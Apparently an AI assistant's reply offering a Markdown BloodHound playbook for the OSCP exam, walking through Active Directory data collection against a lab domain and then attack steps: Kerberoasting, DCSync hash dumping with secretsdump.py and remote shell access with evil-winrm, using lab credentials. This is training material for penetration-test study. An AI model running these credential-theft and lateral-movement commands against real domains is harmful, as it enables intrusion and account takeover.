Perfect — I’ll generate a **complete GitHub Markdown playbook for BloodHound** that’s exam-day friendly. It includes:

* Setup and login details (Neo4j credentials)
* Independent, copy-pasteable commands (Linux + Windows)
* Explanations of what each does and what to expect
* Guidance on running analysis inside BloodHound and which queries are the most useful

Here’s the full notes file:

---

````markdown
# 🩸 BloodHound OSCP Exam Playbook

BloodHound is a graph-based tool that helps penetration testers **map Active Directory attack paths**.  
It does not exploit anything by itself; instead, it shows how compromised accounts can be leveraged to reach **Domain Admin**.

---

## ✅ Why Use BloodHound in OSCP?
- Allowed in the OSCP exam (common candidate mistake: assuming it is banned).  
- Saves hours of manual graphing of user → group → computer → privilege chains.  
- Lets you focus on **executing attacks** instead of guessing where to move next.

---

## 🔧 Install on Kali
```bash
sudo apt update
sudo apt install bloodhound neo4j -y
````

---

## 🛠️ Start Neo4j + BloodHound GUI

```bash
sudo neo4j console      # runs Neo4j database (keep this open)
bloodhound &            # opens BloodHound GUI
```

### Default Neo4j Credentials

```
Username: neo4j
Password: neo4j
```

(You’ll be forced to reset on first login. Save your new password in your exam notes.)

---

## 📡 Step 1: Fix Name Resolution

BloodHound collectors need to resolve the **Domain Controller** (DC) by name, not just IP.

```bash
echo "192.168.131.122 hutchdc.hutch.offsec hutchdc" | sudo tee -a /etc/hosts
```

Check it works:

```bash
getent hosts hutchdc.hutch.offsec
# Expected: 192.168.131.122 hutchdc.hutch.offsec hutchdc
```

---

## 🐍 Step 2: Collect Data from Kali (bloodhound-python)

### Full Collection (best if network is stable)

```bash
bloodhound-python \
  -u 'fmcsorley' \
  -p 'CrabSharkJellyfish192' \
  -d hutch.offsec \
  -dc hutchdc.hutch.offsec \
  -c all \
  --auth-method ntlm \
  --dns-tcp \
  -ns 192.168.131.122 \
  --zip
```

**Explanation**

* `-u / -p`: domain creds you cracked.
* `-d`: domain name (from LDAP/kerbrute).
* `-dc`: DC FQDN.
* `-c all`: run all collection modules.
* `--zip`: bundle JSON into one `.zip`.
* `--auth-method ntlm`: avoids Kerberos ticket issues.
* `-ns`: force DNS queries to the DC itself.

**Expected output**:

```
INFO: Found 1 domains
INFO: Found 18 users
INFO: Found 52 groups
INFO: Saved data to ./20250913_1500_bloodhound.zip
```

### Minimal Collection (faster, avoids session timeout)

```bash
bloodhound-python \
  -u 'fmcsorley' \
  -p 'CrabSharkJellyfish192' \
  -d hutch.offsec \
  -dc hutchdc.hutch.offsec \
  -c Group,LocalAdmin,ACL,ObjectProps,SPNTargets \
  --auth-method ntlm \
  --zip
```

---

## 💻 Step 3: Collect Data from Windows (optional)

If you have RCE or WinRM on a Windows domain host, you can run SharpHound directly:

```powershell
.\SharpHound.exe -c All -d hutch.offsec -DomainController hutchdc.hutch.offsec -zipfilename loot.zip
```

Copy the `.zip` back to Kali for analysis.

---

## 📊 Step 4: Import and Analyze in BloodHound

1. Launch BloodHound (`bloodhound &`).
2. Login with Neo4j creds (neo4j / your reset password).
3. Drag & drop the `.zip` into the GUI.
4. Run analysis queries from the **Analysis tab**:

### 🔎 Useful Queries

* **Shortest Paths to Domain Admins from Owned Principals**
  → Shows the chain from your compromised account to DA.

* **Find Principals with DCSync Rights**
  → If your user has “GetChanges” + “GetChangesAll” → perform a DCSync attack.

* **Find Kerberoastable Users**
  → Accounts with SPNs that can be roasted.

* **Find AS-REP Roastable Accounts**
  → Users without Kerberos pre-auth (attack without knowing a password).

* **Map Domain Trusts**
  → Only relevant if multiple domains exist.

### Expected Output

You’ll see a **graph** of nodes (users, groups, computers) connected by edges (permissions, admin rights, group membership).
Follow the **red highlighted path** to Domain Admin.

---

## 🧠 Common Mistakes (Avoid These in Exam)

* ❌ Forgetting to update `/etc/hosts` → collector crashes with “Name or service not known.”
* ❌ Only saving console logs → GUI needs the **JSON/ZIP**, not logs.
* ❌ Depending only on BloodHound → always confirm edges with manual tools (`ldapsearch`, `rpcclient`, `powerview`).
* ❌ Assuming it’s banned → it is allowed in OSCP.
* ❌ Running with no creds → data is very limited. Crack one password first.

---

## 🚀 Step 5: Execute Attacks (Post-Analysis)

BloodHound only shows the map. You must execute the edges:

* **Kerberoastable user found**:

  ```bash
  GetUserSPNs.py hutch.offsec/fmcsorley:'CrabSharkJellyfish192' -dc-ip 192.168.131.122 -request
  ```

  Crack tickets with hashcat mode 13100.

* **DCSync rights found**:

  ```bash
  secretsdump.py hutch.offsec/fmcsorley:'CrabSharkJellyfish192'@192.168.131.122 -just-dc
  ```

* **Local Admin edge**:

  ```bash
  evil-winrm -i 192.168.131.122 -u fmcsorley -p 'CrabSharkJellyfish192'
  ```

---

## 📝 TL;DR Exam Workflow

1. Enumerate usernames (kerbrute, LDAP).
2. Crack one password (AS-REP roast).
3. Run `bloodhound-python ... --zip`.
4. Import into BloodHound GUI.
5. Run “Shortest Paths to DA.”
6. Confirm steps manually.
7. Execute → Domain Admin → root.txt.

---

# 🔖 Quick Copy-Paste Cheat Sheet

```bash
# Fix name resolution
echo "192.168.131.122 hutchdc.hutch.offsec hutchdc" | sudo tee -a /etc/hosts

# Full collection
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -d hutch.offsec -dc hutchdc.hutch.offsec -c all --auth-method ntlm --dns-tcp -ns 192.168.131.122 --zip

# Minimal collection
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -d hutch.offsec -dc hutchdc.hutch.offsec -c Group,LocalAdmin,ACL,ObjectProps,SPNTargets --auth-method ntlm --zip

# Start services
sudo neo4j console
bloodhound &
```

---

```

---

```
